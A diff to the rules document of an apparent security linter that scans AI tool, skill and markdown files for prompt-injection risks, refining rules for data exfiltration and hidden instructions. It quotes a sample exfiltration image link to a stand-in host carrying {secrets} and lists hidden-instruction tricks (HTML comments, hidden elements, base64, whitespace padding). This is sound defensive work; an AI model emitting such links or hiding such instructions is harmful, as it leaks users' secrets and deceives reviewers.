@@ -108,13 +108,13 @@
 
 ### AI-SEC-010 — Data-exfiltration pattern
 - **Sev** High · **Kinds** md, Tools
-- **Detect** (a) Markdown images/links whose URL contains template placeholders or query params fed by context (`{…}`, `{{…}}`, `$…`, `<data>`), e.g. `![](https://evil.tld/?q={secrets})`; (b) imperative sentences that combine a send verb (`send`, `post`, `upload`, `exfiltrate`, `forward`, `include … in the url`) with a sensitive object (`env`, `secrets`, `credentials`, `api key`, `token`, `conversation`, `ssh`) within one sentence; (c) instructions to `curl`/`fetch` a non-allowlisted domain with data.
+- **Detect** (a) Markdown images/links whose URL contains template placeholders or query params fed by context (`{…}`, `{{…}}`, `$…`, `<data>`), e.g. `![](https://evil.tld/?q={secrets})`; (b) imperative sentences that combine a send verb (`send`, `post`, `upload`, `exfiltrate`, `forward`, `include … in the url`) with a sensitive object (`env`, `secrets`, `credentials`, `api key`, `token`, `conversation`, `ssh`) within one sentence; (c) instructions to `curl`/`fetch` a non-allowlisted domain with data (a data flag or a templated URL). Placeholders count in a URL's host, query or fragment; a single-brace path segment (`/{owner}/{repo}/badge.svg`) is a documentation template and counts only in its `{{…}}`/`$…`/`<…>` forms, and only for images. (b) needs the verb to open its clause and no negator in the three words before it (ADR-024).
 - **Config** `allowed_domains`.
 
 ### AI-SEC-011 — Hidden instructions
 - **Sev** High · **Kinds** md
 - **Detect** Content the model reads but a human reviewer may not see: HTML comments (`<!-- -->`) containing imperative directives (they start with a verb from `lexicon::IMPERATIVES`, or contain `you must`/`always`/`never`) or injection phrases; elements with `display:none` / `hidden`; base64 blobs ≥ 40 chars outside code fences; text-to-whitespace ratios suggesting padding (≥ 200 consecutive spaces/newlines followed by text).
-- **FP guards** Pulse suppression comments, markdownlint/prettier directives and license headers are ignored.
+- **FP guards** Pulse suppression comments, markdownlint/prettier directives, generated-file notices and license headers are ignored for the directive check; injection phrases are reported in any comment. Hidden HTML is read from parsed attributes (ADR-024).
 
 ### AI-SEC-012 — Tool description poisoning
 - **Sev** Critical · **Kinds** Tools, McpConfig (when inline tool metadata exists), Skill (frontmatter description)
